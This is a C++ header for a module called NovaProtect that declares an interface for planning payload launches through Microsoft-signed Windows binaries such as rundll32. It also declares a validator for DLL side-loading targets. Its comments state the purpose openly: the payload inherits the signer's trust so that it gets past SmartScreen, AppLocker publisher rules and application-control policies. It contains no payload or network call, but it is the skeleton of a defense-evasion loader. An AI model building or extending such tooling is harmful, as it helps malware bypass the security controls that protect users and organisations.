#pragma once
// NovaProtect signed-host ("white") launch plans.
//
// Every entry in the catalog is a Microsoft-signed binary that is present on a
// stock Windows install. The point is not that these binaries are unusual --
// it is that a launcher chain through them inherits their signature and their
// publisher at the OS decision points (SmartScreen, AppLocker publisher rules,
// application-control policies keyed on the signer).
//
// What this module produces is a *plan*: exact argv, prerequisites and the
// side-loading contract. It deliberately does not fetch, decrypt or drop the
// payload -- staging is the caller's decision and the plan states it.

#include <string>
#include <vector>

namespace np {

struct WhiteHost {
    const char* name = "";             // file name only
    const char* path = "";             // full default path
    const char* payload_form = "";     // what the payload has to be
    const char* argument_shape = "";   // documented argument layout
    const char* note = "";
};

struct WhiteLaunchPlan {
    std::string host_name;
    std::string host_path;
    std::string payload_path;
    std::string export_name;
    std::vector<std::string> argv;         // exact argument vector, host not included
    std::string command_line;              // fully quoted, host included
    std::vector<std::string> prerequisites;
    std::vector<std::string> notes;

    std::string renderScript(const std::string& title = "NovaProtect launch plan") const;
    std::string renderManifest() const;    // JSON, for the build report
};

class WhiteLauncher {
public:
    static const std::vector<WhiteHost>& catalog();
    static const WhiteHost* find(const std::string& host_name);

    // host_name selects the signed binary, payload is what it should run,
    // export_name is only used by the DLL-shaped hosts (rundll32).
    static bool plan(const std::string& host_name, const std::string& payload,
                     const std::string& export_name, WhiteLaunchPlan& out, std::string& error);

    // Quotes one argument the way MSVCRT/CommandLineToArgvW parses it.
    static std::string quote(const std::string& arg);

    // Checks that a side-load target is plausible: the host exists, the DLL
    // name does not collide with a KnownDLLs entry, and the search order puts
    // the application directory ahead of System32.
    static bool validateSideLoad(const std::string& host_path, const std::string& dll_name,
                                 std::string& error, std::string* warning = nullptr);
};

} // namespace np
